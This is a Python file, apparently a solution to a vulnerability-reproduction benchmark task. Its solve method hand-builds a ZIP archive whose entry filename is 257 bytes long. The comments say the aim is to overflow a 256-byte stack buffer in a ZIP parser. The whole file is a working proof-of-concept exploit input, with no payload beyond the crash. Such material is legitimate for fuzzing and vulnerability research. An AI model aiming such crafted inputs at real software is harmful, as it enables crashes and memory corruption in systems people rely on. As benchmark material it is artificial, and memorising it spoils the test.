import os
import zipfile
import tempfile
import struct
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a zip file with a filename that's longer than 256 bytes
        # to trigger the stack buffer overflow
        
        # Filename that exceeds 256 bytes
        # Common zip implementations have limits on filename length, but we can
        # craft a raw zip structure to bypass those checks
        filename = "A" * 257  # Exactly 257 bytes to overflow by 1
        
        # We'll create a minimal valid zip file with this long filename
        # Zip file structure based on PKZIP APPNOTE.TXT specification
        
        # Create in-memory zip structure
        zip_data = bytearray()
        
        # Local file header (30 bytes + filename length)
        local_header = bytearray()
        local_header.extend(b'PK\x03\x04')  # Signature
        local_header.extend(b'\x14\x00')    # Version needed to extract (2.0)
        local_header.extend(b'\x00\x00')    # General purpose bit flag
        local_header.extend(b'\x00\x00')    # Compression method (stored)
        local_header.extend(b'\x00\x00')    # File modification time
        local_header.extend(b'\x00\x00')    # File modification date
        local_header.extend(struct.pack('<I', 0))  # CRC-32 (0 for no data)
        local_header.extend(struct.pack('<I', 0))  # Compressed size (0)
        local_header.extend(struct.pack('<I', 0))  # Uncompressed size (0)
        local_header.extend(struct.pack('<H', len(filename)))  # Filename length
        local_header.extend(b'\x00\x00')    # Extra field length (0)
        local_header.extend(filename.encode('ascii'))
        
        # Central directory header (46 bytes + filename length)
        central_header = bytearray()
        central_header.extend(b'PK\x01\x02')  # Signature
        central_header.extend(b'\x14\x00')    # Version made by
        central_header.extend(b'\x14\x00')    # Version needed to extract
        central_header.extend(b'\x00\x00')    # General purpose bit flag
        central_header.extend(b'\x00\x00')    # Compression method
        central_header.extend(b'\x00\x00')    # File modification time
        central_header.extend(b'\x00\x00')    # File modification date
        central_header.extend(struct.pack('<I', 0))  # CRC-32
        central_header.extend(struct.pack('<I', 0))  # Compressed size
        central_header.extend(struct.pack('<I', 0))  # Uncompressed size
        central_header.extend(struct.pack('<H', len(filename)))  # Filename length
        central_header.extend(b'\x00\x00')    # Extra field length
        central_header.extend(b'\x00\x00')    # File comment length
        central_header.extend(b'\x00\x00')    # Disk number start
        central_header.extend(b'\x00\x00')    # Internal file attributes
        central_header.extend(struct.pack('<I', 0))  # External file attributes
        central_header.extend(struct.pack('<I', 0))  # Relative offset of local header
        central_header.extend(filename.encode('ascii'))
        
        # End of central directory record (22 bytes)
        end_record = bytearray()
        end_record.extend(b'PK\x05\x06')  # Signature
        end_record.extend(b'\x00\x00')    # Number of this disk
        end_record.extend(b'\x00\x00')    # Disk where central directory starts
        end_record.extend(b'\x01\x00')    # Number of central directory records on this disk
        end_record.extend(b'\x01\x00')    # Total number of central directory records
        end_record.extend(struct.pack('<I', len(central_header)))  # Size of central directory
        end_record.extend(struct.pack('<I', len(local_header)))    # Offset of start of central directory
        end_record.extend(b'\x00\x00')    # Comment length
        
        # Combine all parts
        zip_data.extend(local_header)
        zip_data.extend(central_header)
        zip_data.extend(end_record)
        
        return bytes(zip_data)
